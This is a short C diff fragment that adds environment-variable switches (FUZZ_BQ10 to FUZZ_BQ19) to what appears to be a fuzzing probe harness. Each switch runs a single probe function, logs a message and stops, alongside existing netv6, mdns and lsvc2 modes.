+        if (getenv("FUZZ_BQ10")) { p_bq10(); LOG("[probe13] bq10-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ11")) { p_bq11(); LOG("[probe13] bq11-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ12")) { p_bq12(); LOG("[probe13] bq12-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ13")) { p_bq13(); LOG("[probe13] bq13-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ14")) { p_bq14(); LOG("[probe13] bq14-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ15")) { p_bq15(); LOG("[probe13] bq15-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ16")) { p_bq16(); LOG("[probe13] bq16-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ17")) { p_bq17(); LOG("[probe13] bq17-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ18")) { p_bq18(); LOG("[probe13] bq18-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ19")) { p_bq19(); LOG("[probe13] bq19-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
